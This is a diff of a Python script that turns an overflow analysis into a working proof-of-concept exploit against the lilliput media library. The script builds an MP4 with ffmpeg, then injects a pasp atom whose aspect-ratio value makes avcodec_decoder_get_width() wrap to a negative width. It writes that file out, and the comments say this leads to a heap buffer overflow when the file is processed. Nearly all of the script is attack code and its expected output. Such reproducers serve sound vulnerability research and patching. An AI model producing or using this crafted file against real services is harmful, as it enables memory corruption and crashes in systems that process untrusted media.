@@ -1,123 +1,162 @@
 #!/usr/bin/env python3
 """
-Analysis tool: avcodec SAR integer overflow in lilliput avcodec.cpp
+Reproducer: avcodec SAR integer overflow in lilliput avcodec.cpp
 
-Demonstrates the integer overflow calculation for various SAR values.
-A crafted MP4/MOV with extreme SAR values triggers the overflow.
+Creates a minimal valid MP4 file with an H.264 stream and a `pasp` atom
+whose hSpacing value causes avcodec_decoder_get_width() to overflow:
 
-The actual MP4 construction requires a valid H.264 bitstream (omitted here),
-but this script shows the overflow conditions and expected behavior.
+    return (int64_t)d->codec->width * sar.num / sar.den;
+                                       ^^^^^^^^
+    The int64_t result is implicitly narrowed to `int`, so a crafted
+    sar.num causes the return value to wrap to negative or tiny.
+
+Downstream, the caller allocates an output buffer sized by that dimension
+and sws_scale() writes the full decoded frame into the undersized buffer
+→ heap buffer overflow.
+
+Requirements:
+    ffmpeg (to generate a minimal H.264 stream)
 
 Usage:
-    python3 craft_mp4_sar_overflow.py
+    python3 craft_mp4_sar_overflow.py poc_sar_overflow.mp4
+    python3 craft_mp4_sar_overflow.py                      # defaults to poc.mp4
 """
 
 import ctypes
+import os
 import struct
+import subprocess
+import sys
+import tempfile
 
 
 def simulate_overflow(codec_width, sar_num, sar_den):
-    """
-    Simulate avcodec_decoder_get_width() C behavior.
-    Returns (int64_intermediate, int_result, overflowed)
-    """
-    # C: (int64_t)codec_width * sar_num / sar_den
+    """Simulate the C integer overflow."""
     intermediate_i64 = codec_width * sar_num // sar_den
-    
-    # Cast to C int (32-bit signed, wrapping overflow)
     result_int = ctypes.c_int32(intermediate_i64).value
+    return intermediate_i64, result_int, (intermediate_i64 != result_int)
+
+
+def find_and_replace_pasp(data, new_sar_num, new_sar_den):
+    """Find an existing pasp atom and replace its SAR values."""
+    idx = data.find(b'pasp')
+    if idx >= 4:
+        # pasp atom: [4-byte size][pasp][4-byte hSpacing][4-byte vSpacing]
+        before = data[:idx + 4]
+        after = data[idx + 12:]  # skip old hSpacing + vSpacing
+        return before + struct.pack('>II', new_sar_num, new_sar_den) + after
+    return None
+
+
+def inject_pasp_into_avc1(data, sar_num, sar_den):
+    """
+    Inject a pasp atom into the avc1 sample entry box.
     
-    overflowed = (intermediate_i64 != result_int)
-    return intermediate_i64, result_int, overflowed
+    The pasp atom goes inside the avc1 box (child of stsd), right before
+    the avc1 box's end. We find avc1, extend it and its parent boxes by
+    the pasp atom size (16 bytes).
+    """
+    pasp_atom = struct.pack('>I', 16) + b'pasp' + struct.pack('>II', sar_num, sar_den)
+    pasp_size = len(pasp_atom)
+
+    # Find avc1 box
+    avc1_type_offset = data.find(b'avc1')
+    if avc1_type_offset < 4:
+        return None
+    avc1_offset = avc1_type_offset - 4
+    avc1_size = struct.unpack('>I', data[avc1_offset:avc1_offset + 4])[0]
+    avc1_end = avc1_offset + avc1_size
+
+    # Insert pasp at end of avc1 (before avc1 closes)
+    new_data = bytearray(data[:avc1_end]) + pasp_atom + bytearray(data[avc1_end:])
+
+    # Update avc1 size
+    new_avc1_size = avc1_size + pasp_size
+    struct.pack_into('>I', new_data, avc1_offset, new_avc1_size)
+
+    # Walk up the container hierarchy and expand parent boxes
+    # MP4 structure: ftyp | moov > trak > mdia > minf > stbl > stsd > avc1
+    parent_types = [b'stsd', b'stbl', b'minf', b'mdia', b'trak', b'moov']
+    for ptype in parent_types:
+        type_offset = new_data.find(ptype)
+        if type_offset >= 4:
+            box_offset = type_offset - 4
+            old_size = struct.unpack('>I', new_data[box_offset:box_offset + 4])[0]
+            struct.pack_into('>I', new_data, box_offset, old_size + pasp_size)
+
+    return bytes(new_data)
+
+
+def create_base_mp4(path, width=64, height=64):
+    """Use ffmpeg to create a minimal 1-frame MP4 with known dimensions."""
+    cmd = [
+        'ffmpeg', '-y', '-f', 'lavfi', '-i',
+        f'color=c=red:s={width}x{height}:d=0.04:r=25',
+        '-c:v', 'libx264', '-profile:v', 'baseline', '-level', '3.0',
+        '-pix_fmt', 'yuv420p',
+        '-movflags', '+faststart',
+        '-an',
+        path,
+    ]
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        print(f"ffmpeg failed:\n{result.stderr}", file=sys.stderr)
+        return False
+    return True
 
 
 def main():
-    print("=== avcodec SAR Integer Overflow Analysis ===\n")
-    print("Bug: return (int64_t)d->codec->width * sar.num / sar.den;")
-    print("     The int64_t result is implicitly narrowed to int\n")
-    
-    print(f"{'codec_w':>10} {'sar_num':>10} {'sar_den':>10} {'int64_result':>15} {'int_result':>12} {'overflow':>10}")
-    print("-" * 75)
-    
-    test_cases = [
-        # Normal cases
-        (1920, 1, 1, "normal 1:1 SAR"),
-        (1920, 4, 3, "normal 4:3 SAR"),
-        # Edge cases that overflow
-        (32767, 65535, 1,   "large codec_w + large sar_num"),
-        (16384, 65535, 1,   "medium codec_w + max sar_num"),
-        (65535, 32768, 1,   "large codec_w + half-max sar"),
-        (1920,  2236961, 1, "target overflow: approx 2^31 / 1920"),
-        (1280,  1677722, 1, "target overflow: approx 2^31 / 1280"),
-        (3840,  559241,  1, "4K with extreme SAR"),
-        # Specific overflow to small value
-        (1920,  1119553, 1, "overflow to small positive"),
-    ]
-    
-    for codec_w, sar_num, sar_den, description in test_cases:
-        # Only test cases where sar_num > sar_den (the condition in lilliput)
-        if sar_num <= sar_den:
-            continue
-        
-        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
-        marker = " *** OVERFLOW" if overflowed else ""
-        print(f"{codec_w:>10} {sar_num:>10} {sar_den:>10} {i64:>15,} {i32:>12,} {str(overflowed):>10} {description}")
-    
-    print("\n--- Finding specific overflow to negative value ---")
-    # Brute force: find SAR.num that causes overflow to negative
-    codec_w = 1920
-    for sar_num in range(1_000_000, 2_000_000, 1000):
-        sar_den = 1
-        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
-        if overflowed and i32 < 0:
-            print(f"codec_w={codec_w}, sar_num={sar_num}, sar_den={sar_den}")
-            print(f"  int64 result: {i64:,}")
-            print(f"  int32 result: {i32:,} (NEGATIVE!)")
-            print(f"  This would cause downstream buffer allocation with negative dimension")
-            break
-    
-    print("\n--- Finding overflow to zero ---")
-    codec_w = 1920
-    for sar_num in range(1_000_000, 4_000_000, 1):
-        sar_den = 1
-        i64, i32, overflowed = simulate_overflow(codec_w, sar_num, sar_den)
-        if overflowed and i32 == 0:
-            print(f"codec_w={codec_w}, sar_num={sar_num}, sar_den={sar_den}")
-            print(f"  int64 result: {i64:,}")
-            print(f"  int32 result: {i32} (ZERO!)")
-            print(f"  A zero-width dimension would cause a zero-size allocation")
-            break
-    else:
-        print("  No exact zero overflow found in range")
-    
-    print("\n--- MP4 Attack Vector ---")
-    print("""
-To exploit this in practice:
-1. Craft an MP4 with H.264 video at 1920x1080
-2. Set the pasp (pixel aspect ratio) box in the stsd/avc1 atom:
-   - hSpacing (16-bit): set to overflow value (e.g., 1119553 -- but pasp is 32-bit)
-   - vSpacing (16-bit): normal value
-3. lilliput's avcodec_decoder_get_width() will compute:
-   (int64_t)1920 * hSpacing / vSpacing
-   which overflows to a negative or small value
-4. The Go caller uses this dimension to allocate the output OpenCV matrix
-5. sws_scale() then writes full-resolution data into the undersized buffer
+    output_file = sys.argv[1] if len(sys.argv) > 1 else 'poc.mp4'
 
-Note: pasp atom fields are 32-bit unsigned in MP4, so they can encode
-values up to 4,294,967,295 — easily sufficient to trigger the overflow.
-
-Sample pasp atom bytes for sar_num=2236962, sar_den=1:
-""")
-    sar_num = 2236962
+    codec_width = 64
+    # Pick sar_num that overflows when multiplied by codec_width
+    # (int64_t)64 * 33554433 = 2,147,483,712 → int32 wraps to -2,147,483,584
+    sar_num = 33554433
     sar_den = 1
-    pasp = struct.pack('>I', 12)     # atom size
-    pasp += b'pasp'
-    pasp += struct.pack('>I', sar_num)
-    pasp += struct.pack('>I', sar_den)
-    print(f"  pasp atom: {pasp.hex()}")
-    print(f"  This encodes SAR {sar_num}:{sar_den}")
-    i64, i32, ov = simulate_overflow(1920, sar_num, sar_den)
-    print(f"  Effect on 1920-wide codec: int64={i64:,}, int32={i32:,}, overflow={ov}")
+
+    i64, i32, overflowed = simulate_overflow(codec_width, sar_num, sar_den)
+    assert overflowed, "chosen SAR should overflow"
+    assert i32 < 0, "overflow result should be negative"
+
+    print(f"=== Crafting MP4 with SAR overflow ===")
+    print(f"  Codec width:     {codec_width}")
+    print(f"  SAR:             {sar_num}:{sar_den}")
+    print(f"  int64 adjusted:  {i64:,}")
+    print(f"  int32 truncated: {i32:,}  ← returned by avcodec_decoder_get_width()")
+    print()
+
+    # Step 1: create a base MP4 with ffmpeg
+    with tempfile.NamedTemporaryFile(suffix='.mp4', delete=False) as tmp:
+        base_path = tmp.name
+
+    print(f"[1/3] Creating base MP4 ({codec_width}x{codec_width}) with ffmpeg...")
+    if not create_base_mp4(base_path, width=codec_width, height=codec_width):
+        sys.exit(1)
+
+    with open(base_path, 'rb') as f:
+        mp4_data = f.read()
+    os.unlink(base_path)
+    print(f"      Base MP4: {len(mp4_data)} bytes")
+
+    # Step 2: inject pasp atom with overflow SAR
+    print(f"[2/3] Injecting pasp atom (SAR {sar_num}:{sar_den})...")
+    result = find_and_replace_pasp(mp4_data, sar_num, sar_den)
+    if result is None:
+        result = inject_pasp_into_avc1(mp4_data, sar_num, sar_den)
+    if result is None:
+        print("ERROR: Could not find avc1 box to inject pasp", file=sys.stderr)
+        sys.exit(1)
+
+    # Step 3: write output
+    print(f"[3/3] Writing {output_file}...")
+    with open(output_file, 'wb') as f:
+        f.write(result)
+
+    print(f"\n[+] Wrote {len(result)} bytes to {output_file}")
+    print(f"[+] When lilliput processes this file:")
+    print(f"    avcodec_decoder_get_width() returns {i32} (negative!)")
+    print(f"    Downstream allocates buffer with that dimension → heap overflow")
+    print(f"\n[+] Verify with: ffprobe -show_streams {output_file} | grep -E 'width|sample_aspect'")
 
 
 if __name__ == '__main__':
